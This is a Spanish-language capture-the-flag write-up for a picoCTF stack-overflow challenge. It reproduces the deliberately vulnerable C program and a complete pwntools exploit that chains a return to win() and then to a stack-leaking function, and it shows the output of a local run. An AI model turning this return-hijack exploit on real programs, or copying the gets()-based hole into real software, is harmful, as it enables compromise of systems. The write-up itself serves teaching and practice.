En este ejercicio nos dan un binario y su código fuente:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 16
#define FLAGSIZE 64
#define INPSIZE 10

/*
This program is compiled statically with clang-12
without any optimisations.
*/

void win() {
  char buf[FLAGSIZE];
  char filler[BUFSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
}

void UnderConstruction() {
        // this function is under construction
        char consideration[BUFSIZE];
        char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = "Enter names";
	// *q = "Name 1";
	// *r = "Name 2";
        unsigned long *age;
	printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents);
	printf("Names of user: %p %p %p\n", p,q,r);
        printf("Age of user: %p\n",age);
        fflush(stdout);
}

void vuln(){
   char buf[INPSIZE];
   printf("Give me a string that gets you the flag\n");
   gets(buf); // Buffer Overflow
   printf("%s\n",buf); 
   return;
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  printf("Bye!");
  return 0;
}
```

Como podemos ver hay una función vuln que pregunta por un input de texto y lo pilla de manera insegura con un `gets()`. Entonces, como hay una función `win` podriamos hacer simplemente un ret2win, no?

Pues no. La función win no imprime la flag, si no que solo la guarda el contenido en memoria. Mas especificamente la guarda en el stack gracias a esta linea:

```c
fgets(buf,FLAGSIZE,f); // size bound read
```

Así que solo nos queda intentar buscar una forma de leer la flag en memoria. En este caso, tenemos suerte y nos encontramos que el programa tiene una función en construción que lee y printea muchas cosas del stack:

```c
void UnderConstruction() {
        // this function is under construction
        char consideration[BUFSIZE];
        char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = "Enter names";
	// *q = "Name 1";
	// *r = "Name 2";
        unsigned long *age;
	printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents);
	printf("Names of user: %p %p %p\n", p,q,r);
        printf("Age of user: %p\n",age);
        fflush(stdout);
}
```

Así que el flujo del exploit sería así:

Ret2win (para meter la flag en el stack) -> Leak del stack (llamando a la función en construcción). Aquí está el exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./vuln")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b vuln
'''

def conn():
    if args.LOCAL:
        if args.GDB:
            return gdb.debug([exe.path], gdbscript=gdb_script, env={"SHELL": "/bin/sh"})
        return process([exe.path])
    return remote("addr", 1337)

def main():
    io = conn()
    
    offset = 14
    ret = p32(0x804900e)

    io.recvline(b'Give me a string that gets you the flag\n')
    io.sendline(b'A' * offset + p32(exe.sym["win"]) + p32(exe.sym["UnderConstruction"]))

    io.interactive()

if __name__ == "__main__":
    main()
```

```c
ub1cu0@grr:~/Escritorio/PWN/picoCTF/stack_cache$ python3 solve.py LOCAL
[*] '/home/ub1cu0/Escritorio/PWN/picoCTF/stack_cache/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/picoCTF/stack_cache/vuln': pid 1326
[!] 'keepends' argument is deprecated. Use 'drop' instead.
[*] Switching to interactive mode
AAAAAAAAAAAAAA\x90\x9d\x04\x08\x10\x9e\x04\x08
User information : 0x80c9a04 0x8049ee4 0x8051339 0x80e7000 0x80e7000 (nil)
Names of user: 0xXXXXXXXX 0xXXXXXXXXX 0xXXXXXXXX
Age of user: 0xXXXXXXXX
[*] Got EOF while reading in interactive
```

Y recibiremos la flag, en hexadecimal y en little endian. Gracias por leer!